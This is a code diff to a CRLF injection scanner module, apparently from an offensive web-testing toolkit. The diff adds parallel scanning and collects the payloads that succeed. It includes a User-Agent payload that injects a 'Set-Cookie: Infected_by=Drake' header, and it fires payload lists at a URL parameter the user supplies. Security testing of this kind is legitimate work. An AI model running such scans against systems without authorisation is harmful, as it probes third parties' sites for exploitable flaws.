@@ -16,6 +16,9 @@ import urllib.request
 import urllib3
 import requests
 import time
+from multiprocessing import Pool, TimeoutError
+from core.methods.multiproc import listsplit
+from core.variables import processes
 from core.Core.colors import *
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
 requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
@@ -27,7 +30,7 @@ searchinfo = "CRLF Injection module"
 properties = {}
 
 def check0x00(headers, pay):
-
+    success = []
     vuln = False
     try:
         print(O+' [!] Headers obtained...')
@@ -42,6 +45,7 @@ def check0x00(headers, pay):
                 time.sleep(0.8)
                 if headers['Set-Cookie'].lower() == 'Infected_by=Drake'.lower():
                     vuln = True
+                    success.append(pay)
                 else:
                     vuln = False
 
@@ -57,6 +61,8 @@ def check0x00(headers, pay):
     except Exception as e:
         print(R+' [-] Exception encountered!')
         print(R+' [-] Error : '+str(e))
+
+    return success
 
 def getHeaders0x00(web0x00, headers):
 
@@ -97,6 +103,16 @@ def getFile0x00():
 
     except IOError:
         print(R+' [-] File path '+O+fi+' not found!')
+
+def checkpre(payloads, web00, gen_headers):
+    success = []
+    for pay in payloads:
+        web0x00 = web00 + pay
+        print(C+' [+] Using payload : '+B+str(pay))
+        print(B+' [+] Using !nfected Url : '+GR+str(web0x00))
+        p = getHeaders0x00(web0x00, gen_headers)
+        success += check0x00(p, pay)
+    return success
 
 def crlf(web):
 
@@ -145,21 +161,40 @@ def crlf(web):
 
     print(O+' [*] Using !nfected UA Value : '+inf_headers['User-Agent'])
     m = getHeaders0x00(web, inf_headers)
-    check0x00(m, 'Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201%0d%0aSet-Cookie: Infected_by=Drake')
+    success = []
+    success += check0x00(m, 'Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201%0d%0aSet-Cookie: Infected_by=Drake')
     print(GR+' [*] Initiating '+R+'Parameter Based Check...')
     param = input(O+' [#] Scope parameter (eg. /vuln/page.php?crlf=x) :> ')
     if not param.startswith('/'):
         param = '/' + param
+
+    pa = input("\n [?] Parallelise Attack? (enter if not) :> ")
+    parallel = pa is not ""
+
     e = getFile0x00()
     web0 = web + param
     web00 = web0.split('=')[0] + '='
     try:
-        for pay in payloads:
-            web0x00 = web00 + pay
-            print(C+' [+] Using payload : '+B+str(pay))
-            print(B+' [+] Using !nfected Url : '+GR+str(web0x00))
-            p = getHeaders0x00(web0x00, gen_headers)
-            check0x00(p, pay)
+        if not parallel:
+            for pay in payloads:
+                web0x00 = web00 + pay
+                print(C+' [+] Using payload : '+B+str(pay))
+                print(B+' [+] Using !nfected Url : '+GR+str(web0x00))
+                p = getHeaders0x00(web0x00, gen_headers)
+                success += check0x00(p, pay)
+        else:
+            paylists = listsplit(payloads, round(len(payloads)/processes))
+            with Pool(processes=processes) as pool:
+                res = [pool.apply_async(checkpre, args=(l, web00, gen_headers,)) for l in paylists]
+                for y in res:
+                    i = y.get()
+                    success += i
+        if success:
+            print(" [+] CRLF Injection Vulnerability found! Successful payloads:")
+            for i in success:
+                print(i)
+        else:
+            print(R + "\n [-] No payload succeeded."+C)
     except Exception as e:
         print(R+' [-] Unexpected Exception Encountered!')
         print(R+' [-] Exception : '+str(e))
